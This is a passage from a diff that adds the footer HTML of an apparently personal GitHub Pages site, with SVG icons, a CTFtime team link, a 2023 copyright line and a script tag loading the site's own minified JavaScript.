00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+</a>
+<a href="https://ctftime.org/team/217710" target="_blank" rel="noopener noreferrer me"
+    title="Ctftime">
+    <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 Spencer J.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="https://spencerja.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
